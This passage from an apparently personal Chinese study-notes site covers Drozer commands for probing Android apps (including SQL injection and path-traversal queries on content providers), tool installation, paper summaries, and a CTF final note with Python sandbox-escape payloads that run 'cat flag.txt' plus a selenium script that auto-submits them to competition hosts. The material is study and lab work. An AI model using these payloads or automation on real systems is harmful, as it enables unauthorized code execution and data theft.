這邊就不是像上一個activity一樣是啟動，而是要和他互動，因為service本來就是一個運行在背景的服務，他沒有畫面，無法和一般使用者互動，會需要的module如下 app.service.send Send a Message to a service, and display the reply app.service.start Start Service app.service.stop Stop Service 如果去看app.service.send該如何使用，可以直接看範例就好，簡單來說我們可以丟給service一連串東西，就看逆向之後該service怎麼寫，如果參數不夠，可以用--extra去包後面的參數 dz\u0026gt; run app.service.send com.example.srv com.example.srv.Service --msg 1 2 3 --extra float value 0.1324 --extra string test value Got a reply from com.example.srv/com.example.srv.Service: what: 1 arg1: 2 arg2: 3 Data: value (float) : 0.1324 test (string) : value broadcast receivers exported # 根據[^pixnet-android-broadcast]的說明，broadcast屬於process之間的通訊，根據教學:\n發現這些廣播接收器後，您應該檢查它們的代碼。特別注意onReceive函數，因為它將處理接收到的消息。\n檢測broadcast receiver dz\u0026gt; run app.broadcast.info # 檢測所有broadcast receiver dz\u0026gt; run app.broadcast.info -a \u0026lt;app package name\u0026gt; # 檢查特定app內的broadcast receiver 和前面的exported service一樣，我們要和他們互動，但至於要傳送什麼也是要透過逆向來後來判斷 app.broadcast.info Get information about broadcast receivers app.broadcast.send Send broadcast using an intent app.broadcast.sniff Register a broadcast receiver that can sniff particular intents 根據help的提示如下，可以知道該如何使用send→Sends an intent to broadcast receivers. dz\u0026gt; run app.broadcast.send --action \u0026lt;action name fetch by AndroidManifest.xml\u0026gt; --component \u0026lt;path to the function name\u0026gt; \u0026lt;function name\u0026gt; Examples: Attempt to send the BOOT_COMPLETED broadcast message: dz\u0026gt; run app.broadcast.send --action android.intent.action.BOOT_COMPLETED java.lang.SecurityException: Permission Denial: not allowed to send broadcast android.intent.action.BOOT_COMPLETED from pid=955, uid=10044 content providers exported # 檢查Content Provider的exported狀況 dz\u0026gt; run app.provider.info -a \u0026lt;app package name\u0026gt; # Drozer可以猜測並嘗試多個URI，這樣我們才知道確切的URI長怎樣 dz\u0026gt; run scanner.provider.finduris -a \u0026lt;app package name\u0026gt; 利用逆向判斷他是基於database還是基於file system的Content Provider 基於DataBase #1. 查詢內容 dz\u0026gt; run app.provider.query \u0026lt;URI\u0026gt; [--projection [columns ...]] [--selection conditions] [--selection-args [arg ...]] [--order by_column] [--vertical] #2. 插入內容 dz\u0026gt; run app.provider.insert \u0026lt;URI\u0026gt; [--string key value] [--double key value] [--float key value] [--integer key value] [--long key value] [--short key value] [--boolean key value] #3. 更新內容 #總而言之就是要選擇更新的地方，和要更新的內容為何 #selection參數有點像是一般常見的\u0026#34;WHERE \u0026lt;conditions\u0026gt;\u0026#34; dz\u0026gt; run app.provider.update \u0026lt;URI\u0026gt; --selection \u0026lt;指定是哪一個欄位, format: \u0026#34;column name=?\u0026#34;\u0026gt; --selection-args \u0026lt;用來取代前面selection的問號，可以不只一個\u0026gt; [--string key value] [--double key value] [--float key value] [--integer key value] [--long key value] [--short key value] [--boolean key value] #4. 刪除內容 #幾乎和前面一樣，也就是要指定刪除的位置 dz\u0026gt; run app.provider.delete \u0026lt;URI\u0026gt; --selection \u0026lt;指定是哪一個欄位, format: \u0026#34;column name=?\u0026#34;\u0026gt; --selection-args \u0026lt;用來取代前面selection的問號，可以不只一個\u0026gt; #5. SQLi #這邊是利用query來達到sqli，利用--selection和--projection這兩個參數， #projection這個參數，原文的解釋: #the columns to SELECT from the database, as in \u0026#34;SELECT \u0026lt;projection\u0026gt; FROM ...\u0026#34; dz\u0026gt; run app.provider.query \u0026lt;URI\u0026gt; --selection \u0026#34;\u0026#39;\u0026#34; dz\u0026gt; run app.provider.query \u0026lt;URI\u0026gt; --projection \u0026#34;* #6. Drozer自動發現SQLi dz\u0026gt; run scanner.provider.injection -a \u0026lt;app package name\u0026gt; dz\u0026gt; run scanner.provider.sqltables -a \u0026lt;app package name\u0026gt; 基於File System #1. 讀取文件 dz\u0026gt; run app.provider.read \u0026lt;URI+path\u0026gt; #2. Path Traversal dz\u0026gt; run app.provider.read \u0026lt;URI+../../../../+path\u0026gt; #3. Drozer自動發現Path Traversal dz\u0026gt; run scanner.provider.traversal -a \u0026lt;app package name\u0026gt; #4. Download File to Local run app.provider.download \u0026lt;URI+path\u0026gt; hosts is debuggable # 可以直接用drozer找，或者是直接看AndroidManifest.xml中有無提到==debuggable=\u0026ldquo;true\u0026rdquo;==\n# 找到所有debuggable的app dz\u0026gt; run app.package.debuggable "},{"id":102,"href":"/tools/others/android-related/installation/drozer_mobsf-installation/","title":"Drozer/MobSF Installation","section":"Tools","content":" Drozer/MobSF Installation # Installation - Drozer # 我是參考1的說明，但其實參考官網的也可以，我是用docker裝\nDownload drozer-agent \u0026amp; Install - Download 這是要安裝在手機測試端的類似一個server的概念，而我們的電腦端也要安裝類似的東西(有好幾種方式，我是用Docker)，讓電腦和手機可以互通 $ adb install drozer-agent.apk Start a Session 打開agent app會發現右下角有一個Off，點擊後會變成On，代表這個agent已經準備好要和電腦這邊的server連接 ![Screenshot_20240603-131808](https://hackmd.io/_uploads/SkPEfC9NC.png =200x) 設定電腦的Port轉發到Android的某個Port 根據2的說明，以及官網的要求，我們必須要把電腦31415這個port的封包轉發到手機端的31415這個port Android 的 adb forward 通訊埠轉發的功能，adb forward 的功能是轉發 PC 電腦上某個埠號 (port) 資料到 Android 裝置的某個埠號 (port)，例如：下列 adb forward 指令就是將 PC 端的 port 10000 收到的資料，轉發給到 Android Device 的 port 20000\n$ adb forward tcp:31415 tcp:31415 Install PC Drozer Client 看到以下畫面就代表成功了 $ docker run -it --add-host host.docker.internal:host-gateway withsecurelabs/drozer console connect --server host.docker.internal Selecting ff762fc058e91df3 (Google Pixel 6a 13) .. ..:. ..o.. .r.. ..a.. . ....... . ..nd ro..idsnemesisand..pr .otectorandroidsneme. .,sisandprotectorandroids+. ..nemesisandprotectorandroidsn:. .emesisandprotectorandroidsnemes.. ..isandp,..,rotecyayandro,..,idsnem. .isisandp..rotectorandroid..snemisis. ,andprotectorandroidsnemisisandprotec. .torandroidsnemesisandprotectorandroid. .snemisisandprotectorandroidsnemesisan: .dprotectorandroidsnemesisandprotector. drozer Console (v3.0.2) dz\u0026gt; Installation - MobSF # 可以直接使用線上的工具，也可以用docker架在自己的電腦\n$ docker pull opensecurity/mobile-security-framework-mobsf:latest $ docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest 並透過瀏覽器訪問 http://127.0.0.1:8000 ，default的帳密是==mobsf/mobsf==\nReference # How to Install Drozer using Docker\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nAndroid adb forward 通訊埠轉發用法教學\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":103,"href":"/survey-papers/federated-learning/eiffel_-ensuring-integrity-for-federated-learning---notes/","title":"EIFFeL: Ensuring Integrity For Federated Learning - Notes","section":"Survey Papers","content":" EIFFeL: Ensuring Integrity For Federated Learning - Notes # tags: Meeting Paper NTU # :::info Roy Chowdhury, A., Guo, C., Jha, S., \u0026amp; van der Maaten, L. (2022, November). Eiffel: Ensuring integrity for federated learning. In Proceedings of the 2022 ACM SIGSAC Conference on Computer and Communications Security (pp. 2535-2549). :::\nBackground # 聯邦學習的簡單介紹\n聯邦學習的流程大致上可以分成4步驟：\n確定架構(拓樸) Formulate topology 梯度計算 Gradient compute 資訊交換 Information exchange 模型聚合 model aggregation What is Secure Aggregation?\nWhat is Byzantine attacks?\n目前針對聯邦學習的拜占庭攻擊主要分為三種模式。\n數據污染攻擊，是通過在客戶端本地數據集中加入污染過的圖片使得客戶端上傳的模型準確度很差，進而影響全局模型。常見的數據污染攻擊包括標簽反轉攻擊（Label-flipping Attack）、基於反向梯度優化的攻擊（Back-gradient optimization based attack）等等。相比於其他方式，數據污染攻擊的攻擊強度比較弱、攻擊精度比較差，但是比較容易進行。\n模型污染攻擊，是在模型的訓練過程中以及傳輸過程中進行修改，不涉及對本地數據的變更，代表是局部模型污染攻擊（Local Model Poisoning Attack）。模型污染攻擊的攻擊強度很高，並且可以進行更有針對性的攻擊，但是相應的也需要對客戶端更多的控制權。\n第三種攻擊模式是前兩種攻擊的融合，比如目標模型污染（Targeted Model Poisoning）和隱式模型污染（Stealthy Model Poisoning）。第三種模式不但會修改被控制的客戶端的本地數據，而且也會對模型訓練過程進行影響。相比於前兩種攻擊方式，第三種攻擊方式不但擁有較好的隱秘性而且還擁有很強的精確性。\n如何防禦： 傳統的比較流行的方式有Chen等人提出的GeoMed算法，這是一種基於幾何中值的聚合規則。 Blanchard等人則是在聚合過程中加入了Krum函數，通過比較權重之間的距離來選擇威脅度最小的權重進行更新。 而Yin等人則提出了Trimmed Mean算法，通過去掉最大最小值之後進行權重的平均來更新全局的模型。 綜合考慮多項指標的方法，比如向服務器端引入小的根數據集，並用根數據集訓練小模型來以此為標準進行惡意客戶端篩選的FLTrust。 引入其他機器學習思想的方法，比如Justinian’s GAAvernor利用了強化學習，在服務器端訓練一個魯棒性很強的輔助模型來幫助服務器進行選擇。 What is secret-shared non-interactive proofs and example - from ChatGPT:\nSecret-shared non-interactive proofs are a type of cryptographic protocol that allows multiple parties to jointly prove the correctness of a computation, without revealing any private information about their inputs.\nIn a secret-shared non-interactive proof, the computation is divided into multiple parts, and each party holds a share of the inputs and outputs of the computation. The parties can then jointly prove the correctness of the computation by exchanging messages with each other, without revealing their shares of the inputs and outputs.\nThis type of protocol is particularly useful in scenarios where multiple parties need to collaborate on a computation while preserving the privacy of their inputs. For example, secret-shared non-interactive proofs can be used in multi-party computation to allow multiple parties to jointly compute a function on their private inputs, without revealing those inputs to each other.\nOverall, secret-shared non-interactive proofs are an important tool in modern cryptography for enabling secure and private computation in collaborative settings.\nExample:\nSuppose that Alice, Bob, and Charlie each have a secret number, x, y, and z respectively, and they want to compute the sum of their three numbers without revealing their individual inputs to each other.\nTo achieve this, they can use a secret-sharing scheme such as Shamir\u0026rsquo;s secret sharing to split each of their numbers into multiple shares, such that no single share reveals any information about the original number. Each party then distributes their shares to the other two parties.\nNext, they can use a secret-shared non-interactive proof protocol to jointly prove that they have correctly computed the sum of their shared numbers, without revealing their individual shares to each other. For example, they can use a zero-knowledge proof protocol to prove that the sum of the shares they hold is equal to the sum of their original numbers.\nOnce the proof is complete, they can use the shared values to compute the sum of their three secret numbers without revealing any information about their individual inputs.\nOverall, this example demonstrates how secret-shared non-interactive proofs can be used to enable secure and private multi-party computation.\n:::spoiler Chinese Version 秘密共享的非交互式證明是一種加密協議，它允許多方共同證明一個計算的正確性，而不透露任何關於他們輸入的私人信息。\n在秘密共享的非交互式證明中，計算被分為多個部分，每一方都持有計算的輸入和輸出的份額。然後，各方可以通過互相交換消息來共同證明計算的正確性，而不透露他們在輸入和輸出中的份額。\n這種類型的協議在多方需要合作進行計算的情況下特別有用，同時保留他們輸入的隱私。例如，秘密共享的非交互式證明可以在多方計算中使用，以允許多方在他們的私人輸入上聯合計算一個函數，而不把這些輸入透露給對方。\n總的來說，秘密共享的非交互式證明是現代密碼學的一個重要工具，可以在協作環境中實現安全和隱私的計算。\n假設愛麗絲、鮑勃和查理各自有一個秘密數字，分別是x、y和z，他們想計算他們三個數字的總和而不向對方透露他們各自的輸入。\n為了實現這一點，他們可以使用秘密共享方案，如Shamir的秘密共享，將他們的每個數字分成多個份額，這樣，任何一個份額都不會泄露關於原始數字的任何信息。然後，每一方將他們的份額分配給另外兩方。\n接下來，他們可以使用秘密共享的非交互式證明協議來共同證明他們已經正確地計算了他們共享的數字之和，而不向對方透露他們各自的份額。例如，他們可以使用一個零知識證明協議來證明他們持有的份額之和等於他們的原始數字之和。\n一旦證明完成，他們就可以使用共享值來計算他們三個秘密數字的總和，而不透露任何關於他們個人輸入的信息。\n總的來說，這個例子展示了秘密共享的非交互式證明如何被用來實現安全和隱私的多方計算。 :::\nWhat is Probabilistic Polynomial Time?\nA probabilistic polynomial-time (PPT) algorithm A is an algorithm that runs in polynomial time but also has access to some oracle which provides true random bits. So if we input x into A, instead of getting an output y=A(x) that is a deterministic value, we get a random variable Y which has a certain probability of being a set of different values. 概率多項式時間（PPT）算法A是一種在多項式時間內運行的算法，但也可以訪問一些提供真正隨機比特的預言機(不太懂)。因此，如果我們把x輸入A，不是得到一個確定性的輸出值y=A（x），我們得到一個隨機變量Y，它有一定的概率是一組不同的值\n神奇的零知识证明！既能保守秘密，又让别人信你！\n要達到零知識證明需要三個條件：\n完備性(Completeness)：真的假不了；假如Prover掌握某種訊息，則Prover可以很輕易的回答Verifier所提出的問題，且Verifier也可以很輕鬆的驗證答案的正確性 合理性/正確性(Soundness)：假的真不了；假如Prover沒有掌握某種訊息，則Prover有極高的機率會回答錯誤 零知識(Zero knowledge)：對答的過程中，不會透漏任何有關關鍵訊息的資訊 【隐私计算笔谈】MPC系列专题（五）：Beaver三元组和BMR协议\n"},{"id":104,"href":"/problem-solutions/endnote---invalid-citation/","title":"Endnote - Invalid Citation","section":"Problem Solutions","content":" Endnote - Invalid Citation # 目前遇到的怪問題，先紀錄起來，之後再解決\nProblem # 使用Endnote寫論文，因不明原因導致關閉Word之後，出現某一些references不見了，而且經過一些測試，不見的論文都是同樣幾篇，\n已嘗試的方法 # 重新remove該reference後，再cite一次，但只要關閉word，重開後就還是回復原樣 刪除endnote的data file，並且建立新的library，再從雲端拉資料下來，再重複方法1，還是無果 複製一份新的paper template(原本的這一篇也是用這個template改的)，再重新把資料從舊的word，一段一段搬運過去，並且同步cite各個reference，但還是一樣，重新開啟Word後，在同樣的幾篇論文出現Invalid Citation 在Endnote中去除有問題的幾篇論文，再重新下載Google Scholar的Endnote Files，然後再用一樣的方法cite，結果還是一樣 如果用一篇完全空白的word，並且用Endnote cite那幾篇有問題的論文，會發現沒有出現任何問題 確定的事情 # 雲端的資料應該沒有問題 出現問題的應該是Word，但不確定是哪邊 目前可能的解決方式是直接開一個新的Word，然後一段一段搬運過去，就不要用Template改\n更新 # 我大概知道原因了，基本上應該是Endnote無法處理\u0026quot;範圍\u0026quot;，也就是類似[10-13]這樣的關係，雖然不知道為什麼，但其實只要把範圍拆開獨立顯示-\u0026gt;[10][11][12][13]就沒問題了，不過之後還是要查一下為什麼會這樣\n"},{"id":105,"href":"/knowledge/english-writing-vocabulary/","title":"English Writing Vocabulary","section":"Knowledges","content":" English Writing Vocabulary # tags: English Writing # Verbs # Normal Replaced by Comment or Example Assert Say The author asserts that the issue is lacking a simple solution. Advantageous good The author’s most salient solution is her most advantageous, as one can reason that it would effectively solve the problem. concurrency at the same time N/A Employ use The author employs rhetorical questions in order to assert her beliefs in a more persuasive manner. Use Utilize 兩者不完全一樣，refer to this page，utilize是帶點主要用途以外的使用方式You can use my chopsticks to eat noodles.You can utilize chopsticks to keep your hair in a bun. be associated with sth The cancer risks associated with smoking have been well documented Conjunction # Normal Replaced by Firstly To begin with\u0026hellip; Secondly In addition Thirdly Furthermore Lastly In conclusion\u0026hellip; Also Moreover Anyway Nevertheless I think In my opinion So Therefore And In addition But However Oral # Normal Replaced by Comment or Example Me too Welcome to the club Me too Ditto Me too Same Here Nice to meet you. Same here Adjective # Normal Replaced by Comment or Example Very Importatnt Significant Very Easy Effortless Very Crowded Bustling Wow, a bustling metropolitan newsroom. Very quick Rapid Very funny Hilarious Very happy Ecstatic Very busy Swamped Very rich Wealthy Very upset distraught Very cold Freezing Very colorful vibrant Very bad awful Very smart Intelligent Very sad sorrowful Very strong forceful Phrase # Phrase Description Example Regarding=In regard to=with regard to 工作上很常出現的英文詞語。也可以說它就是一個固定化的片語，在商業場合中很常看到。意思是「關於~」「有關～」 1. Regarding the meeting schedule, please see the attached file.關於會議的日程，請看附件。※Email用2. I got an inquiry from a customer regarding this issue.關於這個議題，我收到了來自一位客人的詢問。就像你看到的，「regarding」後面會接名詞子句。它可以放在句首或是句中，取決於想要在句子中強調什麼。（例如的上面第1句，強調關於會議的日程…，第2句則是強調收到了詢問的這件事。）用「regarding」的時候，請注意後面不要再加「to」了。 In Terms Of 接下來的「in terms of」，不只是在商業場合、在日常生活中可能也常常聽到。意思除了「關於~」之外，還帶有像「在～點上」，這樣限定、指定什麼的感覺。 1. In terms of location, the hotel was great but the service was not satisfactory.就位置而言，這間飯店很棒，但服務差強人意。2.We are not doing very well in terms of making a profit.就創造利益而言，我們做的不是很好。「In terms of」後面也是接名詞子句。這兩句並不是說不能用「regarding」，但「in terms of」比較有限定、和其他方面相比的感覺。 As For 單字很簡單、是很短的片語，因此實際上它可能也是最容易使用的表現了。雖然是「關於~」「有關～」的意思，但它還有一點話題轉換的感覺。是在日常對話或是商業場合中都可以使用的表現。 1. As for me, I like Spanish food more than Italian.至於我呢，我喜歡西班牙料理更勝於義大利的。2. As for the new project, we will discuss it later.至於這個新計畫，我們稍後會討論它。「As for」如同例句1中，很常用「As for me」像這樣訴說關於自己的事情。另外，在這個用法中不能用「regarding」來代替。例句2是「as for」用在商業場合等的例子，但這邊就可以用「regarding」或是「with regard to」了。順帶一提，兩句如果用「in terms of」的話都不太自然。「As for」還有要放在句首的這個規定。因此，如果想要強調「as for」之後接的詞語的話就可以使用它。 Regarding VS. In terms of VS. As for 資料來源: 「Regarding」「In Terms Of」的差別是！？ Regarding（in regard to, with regard to）: 表示「關於~」可以使用、是很廣泛的表現。放在句首或句中都可以。不適合用「In terms of」或是「as for」的情況下，用這個幾乎就是對的了。 In terms of: 「關於~」，限定、特定某個主題，是可以比較明確的表示關於什麼的一種表現。另外，想和其他東西比較的時候也很好用。 （例：關於〇〇很棒，但〇〇就不太行了。) 放在句首或句中都可以。 As for: 在關於人的事情時很常使用。（例：as for me, as for him, as for my mother等） 很常用來代替「Regarding」使用，一定要放在句首。比起「Regarding」，它有一點話題轉換的感覺。 Reference # 英文作文常用單字\n"},{"id":106,"href":"/security/competition/eof-ais3-final/","title":"EOF AIS3 Final","section":"Securities","content":" EOF AIS3 Final # tags: CTF AIS3 # Reference # https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/\nhttps://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html\nhttps://github.com/mhchia/practice/blob/master/ctf/final/write_up.md\nSSTI: https://www.freebuf.com/articles/network/258136.html https://www.compart.com/en/unicode/U+FF5B https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection\nPayload:\nprint(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[\u0026#39;execl\u0026#39;](\u0026#34;/bin/cat\u0026#34;, \u0026#34;cat\u0026#34;, \u0026#34;./flag.txt\u0026#34;)) print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[\u0026#39;popen\u0026#39;](\u0026#34;cat /flag.txt\u0026#34;)) file = \u0026#39;FLAG.TXT\u0026#39; print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[\u0026#39;execl\u0026#39;](\u0026#34;/bin/cat\u0026#34;, \u0026#34;cat\u0026#34;, file.lower())) file = \u0026#39;FLAG.TXT\u0026#39; command = \u0026#39;EXECL\u0026#39; print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[command.lower()](\u0026#34;/bin/cat\u0026#34;, \u0026#34;cat\u0026#34;, file.lower())) file = \u0026#39;FLAG.TXT\u0026#39; print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[\u0026#39;spawnl\u0026#39;](\u0026#39;P_WAIT\u0026#39;, \u0026#34;/bin/cat\u0026#34;, \u0026#34;cat\u0026#34;, file.lower())) Script - run_script.py # :::spoiler\nimport subprocess import time import multiprocessing as mp def cycle(i): subprocess.call([\u0026#39;python\u0026#39;, \u0026#39;script.py\u0026#39;, \u0026#39;--team\u0026#39;, str(i)]) if __name__ == \u0026#34;__main__\u0026#34;: p1 = mp.Process(target=cycle, args=(\u0026#39;1\u0026#39;,)) p2 = mp.Process(target=cycle, args=(\u0026#39;2\u0026#39;,)) # p3 = mp.Process(target=cycle, args=(\u0026#39;3\u0026#39;,)) # p4 = mp.Process(target=cycle, args=(\u0026#39;4\u0026#39;,)) # p5 = mp.Process(target=cycle, args=(\u0026#39;5\u0026#39;,)) # p7 = mp.Process(target=cycle, args=(\u0026#39;7\u0026#39;,)) # p8 = mp.Process(target=cycle, args=(\u0026#39;8\u0026#39;,)) # p9 = mp.Process(target=cycle, args=(\u0026#39;9\u0026#39;,)) # p10 = mp.Process(target=cycle, args=(\u0026#39;10\u0026#39;,)) # p11 = mp.Process(target=cycle, args=(\u0026#39;11\u0026#39;,)) # p12 = mp.Process(target=cycle, args=(\u0026#39;12\u0026#39;,)) # p13 = mp.Process(target=cycle, args=(\u0026#39;13\u0026#39;,)) # p14 = mp.Process(target=cycle, args=(\u0026#39;14\u0026#39;,)) # p15 = mp.Process(target=cycle, args=(\u0026#39;15\u0026#39;,)) # p16 = mp.Process(target=cycle, args=(\u0026#39;16\u0026#39;,)) # p17 = mp.Process(target=cycle, args=(\u0026#39;17\u0026#39;,)) # p18 = mp.Process(target=cycle, args=(\u0026#39;18\u0026#39;,)) # p19 = mp.Process(target=cycle, args=(\u0026#39;19\u0026#39;,)) # p20 = mp.Process(target=cycle, args=(\u0026#39;20\u0026#39;,)) # p21 = mp.Process(target=cycle, args=(\u0026#39;21\u0026#39;,)) # p22 = mp.Process(target=cycle, args=(\u0026#39;22\u0026#39;,)) # p23 = mp.Process(target=cycle, args=(\u0026#39;23\u0026#39;,)) # p24 = mp.Process(target=cycle, args=(\u0026#39;24\u0026#39;,)) p1.start() time.sleep(2) p2.start() time.sleep(2) # p3.start() # p4.start() # p5.start() # p7.start() # p8.start() # p9.start() # p10.start() # p11.start() # p12.start() # p13.start() # p14.start() # p15.start() # p16.start() # p17.start() # p18.start() # p19.start() # p20.start() # p21.start() # p22.start() # p23.start() # p24.start() p1.join() p2.join() # p3.join() # p4.join() # p5.join() # p7.join() # p8.join() # p9.join() # p10.join() # p11.join() # p12.join() # p13.join() # p14.join() # p15.join() # p16.join() # p17.join() # p18.join() # p19.join() # p20.join() # p21.join() # p22.join() # p23.join() # p24.join() :::\nScript - script.py # from selenium.webdriver.chrome.options import Options import time from http.client import PAYMENT_REQUIRED from selenium import webdriver from selenium.webdriver.common.keys import Keys #send keys on keyboard \u0026#39;\u0026#39;\u0026#39;hault the page until it find some label appear on the page\u0026#39;\u0026#39;\u0026#39; from selenium.webdriver.common.by import By from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC \u0026#39;\u0026#39;\u0026#39;imitate the action that human execute on mouse and keyboard\u0026#39;\u0026#39;\u0026#39; from selenium.webdriver.common.action_chains import ActionChains \u0026#39;\u0026#39;\u0026#39;to do some keyboard instruction-\u0026#39;\u0026#39;\u0026#39; import pyautogui import time import argparse def parse_args(): parser = argparse.ArgumentParser() \u0026#39;\u0026#39;\u0026#39;ARM\u0026#39;\u0026#39;\u0026#39; parser.add_argument(\u0026#39;--team\u0026#39;, type=str, default=\u0026#39;1\u0026#39;, help=\u0026#39;team id.\u0026#39;) return parser.parse_args() def read_write_file(type, write_data = None): file_path = \u0026#39;D:/Download/test.txt\u0026#39; if type == \u0026#39;r\u0026#39;: f = open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#34;utf-8\u0026#34;) #u must add encoding parameter arr = [] for line in f.readlines(): arr.append(line) f.close() return arr elif type == \u0026#39;a\u0026#39;: f = open(file_path, \u0026#39;a\u0026#39;, encoding=\u0026#39;UTF-8\u0026#39;) f.write(write_data + \u0026#39;\\n\u0026#39;) f.close() elif type == \u0026#39;refresh\u0026#39;: f = open(file_path, \u0026#39;w\u0026#39;, encoding=\u0026#39;UTF-8\u0026#39;) f.write(\u0026#39;\u0026#39;) f.close() args = parse_args() from selenium.webdriver.support.wait import WebDriverWait driver = webdriver.Chrome(\u0026#39;D:/Download/chromedriver.exe\u0026#39;) driver.get(\u0026#34;http://10.11.0.1:5001/panel\u0026#34;) token = \u0026#39;123\u0026#39; payload = \u0026#34;print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[\u0026#39;popen\u0026#39;](\u0026#39;cat flag.txt\u0026#39;).read())\u0026#34; \u0026#39;\u0026#39;\u0026#39;Login\u0026#39;\u0026#39;\u0026#39; text_input = driver.find_element(By.ID, \u0026#34;token\u0026#34;) ActionChains(driver).send_keys_to_element(text_input, token).perform() driver.find_element(By.TAG_NAME, \u0026#39;button\u0026#39;).click() time.sleep(5) \u0026#39;\u0026#39;\u0026#39;Choose which team\u0026#39;\u0026#39;\u0026#39; # from selenium.webdriver.support.ui import Select # select = Select(driver.find_element(By.NAME, \u0026#39;target\u0026#39;)) # select.select_by_index(0) # from selenium.webdriver.common.keys import Keys # for op in select.options: # if op.text != \u0026#39;--------passing_baseline_v2---------\u0026#39;: # css_panel = driver.find_element(By.CLASS_NAME, \u0026#34;CodeMirror\u0026#34;) # print(css_panel) # code_mirror_element = css_panel.find_element(By.XPATH, \u0026#34;/html/body/main/form[2]/p[2]/div/div[1]/textarea\u0026#34;) # print(code_mirror_element) # code_mirror_element.send_keys(Keys.CONTROL + \u0026#34;a\u0026#34;) # time.sleep(5) # print(op.text) \u0026#39;\u0026#39;\u0026#39;Send Payload\u0026#39;\u0026#39;\u0026#39; cursor = driver.find_element(By.XPATH, \u0026#34;//form[@id=\u0026#39;jail-form\u0026#39;]/p/div/div[6]\u0026#34;) cursor.click() pyautogui.hotkey(\u0026#39;ctrl\u0026#39;,\u0026#39;a\u0026#39;) pyautogui.hotkey(\u0026#39;delete\u0026#39;) ActionChains(driver).send_keys_to_element(cursor, payload).perform() time.sleep(5) # Scrolled down by user driver.find_element(By.XPATH, \u0026#39;/html/body/main/form/button\u0026#39;).click() time.sleep(5) \u0026#39;\u0026#39;\u0026#39;Catch Response \u0026amp; Write to file\u0026#39;\u0026#39;\u0026#39; print(driver.find_element(By.XPATH, \u0026#39;/html/body/div/div/div[2]\u0026#39;)) print(args.team) # read_write_file(\u0026#39;a\u0026#39;, 123) "},{"id":107,"href":"/survey-papers/android-+-security/exploiting-ml-alg-for-efficient-detection-and-prevention-of-js-xss-attacks-in-android-based-hybrid-applications/","title":"Exploiting ML ALG for Efficient Detection and Prevention of JS-XSS Attacks in Android Based Hybrid Applications","section":"Survey Papers","content":" Exploiting ML algorithms for Efficient Detection and Prevention of JavaScript-XSS Attacks in Android Based Hybrid Applications # :::info Khalid, U., Abdullah, M., \u0026amp; Inayat, K. (2020). Exploiting ML algorithms for Efficient Detection and Prevention of JavaScript-XSS Attacks in Android Based Hybrid Applications. arXiv preprint arXiv:2006.07350. ::: 這一篇論文對於我的研究只有一點點用，大概補足了一些我對Android的XSS漏洞的認識。主要是在利用一些feature，訓練出能夠檢測有無XSS攻擊的模型\nIntroduction # 首先，很多的手機App中都會使用WebView這個Component，也就是能夠直接嵌入一個mini browser在App中而不需要另外開啟外部的Browser才能瀏覽網頁，所以JS語言就能夠和Java語言互動，問題在於當從 JavaScript 呼叫 Java 時，攻擊者會將惡意 JavaScript 程式碼儲存在網頁中，當網頁在應用程式中開啟時，然後在 WebView 中註冊一個物件。 首先，攻擊者透過 JavaScript 存取該對象，並透過該對象存取該應用程式的本機方法，攻擊者可以透過觸發本機方法內的重要內建函數輕鬆取得不同的智慧型手機資源。\nContribution # 自行創建一個Dataset，並且從500個不同的Apps中extract出7個不同的feature 訓練7種不同的ML 模型: Evolutionary-Support Vector Machine (E-SVM), Neural Network, Naive Bayes, Support Vector Machine(SVM), Bagging, Random Forest and J48 根據實驗結果給出F1-Score和執行時間，結果顯示Random Forest是最好的模型 Background # WebView 這個component的存在理由如上所述，其中會用到幾的API: setJavaScriptEnabled API addJavascriptInterface API loadUrl API 第一個是enable可以使用JS，第二個是註冊Java物件，第三個就是實際把網頁load進來 Sandbox 如上圖，一般來說webview的瀏覽是會經過sandbox，確保可以控制web browser的access，讓他和本地資源不會共享；網頁和網頁之間要隔離，而網頁和主系統之間也會隔離 Bypassing sandbox mechanism 從上圖可以看出，儘管WebView中存在沙箱安全機制來保護行動裝置本地資源免受JavaScript攻擊，但WebView本身借助WebView提供的API繞過了沙箱機制。 這創建了一條路徑，JavaScript 可以輕鬆地與本機 Java 通訊。 並且攻擊者可以觸發Java的不同類別方法發動XSS攻擊，透過原生Java程式碼存取行動裝置的重要功能包括本機資源。 哪些類型的易受攻擊的 API 可以透過 Java 物件觸發？ 作者有整理出來一個表如下: Proposed Method # 現在的重點是要如何分辨一個App他啟動了webview之後，是否會造成XSS攻擊，作者提出了由四個Level組成的偵測框架以及三個Layers的預防框架\nDetection Framework Level 1: 蒐集資料與前處理 Level 2: 10-fold cross validation去訓練模型 Level 3: 結果評估以及預測有無攻擊 Level 4: 利用Selection Algorithm評估各個features的重要性是多少 Prevention Framework 首先，當一個App在Webview中啟動了惡意網站，並且call了addJavaScriptInterface() API 在完成註冊之前，有關Java物件的資訊進入Threat Prevention Unit。 然後特徵提取器從Threat Prevention Unit提取Java物件的特徵並將特徵資訊提供給檢測單元。 偵測單元取得所有特徵，並使用 ML 演算法對這些特徵進行分類，如前所述。 之後，它將最終結果（是否攻擊[Yes / No]）發送給威脅預防單元，因此檢測單元透過這種方式攔截對addJavaScriptInterface() API的呼叫。 如果Threat Prevention Unit從檢測單元接收到“是”，則建議的方法呼叫警報應用程式：否則，它繼續進行步驟(9)，以自動允許，然後繼續進行步驟(10)以完成Jave物件註冊。 警報應用程式警告使用者有關威脅的訊息，其中顯示有關攻擊網頁名稱、物件名稱、物件呼叫的安全敏感 API 的資訊。 使用者回覆警報應用程式以決定是否停用Java物件。 警報應用程式將使用者的決定轉發給威脅預防單元。 Threat Prevention Unit根據使用者的決定進一步決定是否停用該物件。 如果Threat Prevention 